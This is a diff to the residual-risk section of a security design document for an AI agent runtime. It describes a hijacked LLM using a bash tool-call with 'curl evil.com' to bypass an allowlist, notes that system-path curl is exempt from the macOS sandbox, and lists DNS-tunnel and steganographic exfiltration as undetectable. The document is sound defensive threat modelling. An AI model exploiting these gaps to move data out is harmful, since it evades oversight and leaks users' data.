@@ -282,7 +282,7 @@ Out of scope for v1 (documented residual risk; revisit when justified by user ba
 - Windows: Job Object alone is insufficient — defer host-level enforcement to v3 with WFP (Windows Filtering Platform).
 
 **v1 residual risk (documented, significant):**
-- A hijacked LLM that issues a `bash` tool-call with `curl evil.com` bypasses `reqwest` allowlist entirely. Mitigated only by §5 (`bash` disabled by default) + §17 tool-cooldown. Real fix is B1 sandbox.
+- A hijacked LLM that issues a `bash` tool-call with `curl evil.com` bypasses `reqwest` allowlist entirely. Mitigated only by §5 (`bash` disabled by default) + §17 tool-cooldown, plus (macOS only) the B1 process-spawn allowlist (`mur-agent-runtime/src/sandbox/macos.rs`): SBPL denies `process-exec` by default and re-allows only `spawn_allowed_paths` plus the standard system binary roots (`/bin`, `/usr/bin`, `/usr/lib`) needed to keep the shell usable — so a non-system `curl` binary outside the allowlist is kernel-denied, but `curl` shipped under those system roots is exempt by design (bash usability trade-off; see `docs/cookbook/b1-runtime-enforcement.md` "Process-spawn enforcement"). Linux and Windows have no kernel-level exec allowlist yet — hook layer only. Real fix is B1 sandbox landing on all platforms + a stricter shell-only mode that also fences system paths.
 - DNS-tunnel exfil via legit-looking lookup is undetectable at hook layer.
 - Steganographic exfil via legitimate model-API traffic (encoding stolen content into prompts / completions) is undetectable. No realistic defence v1.
 
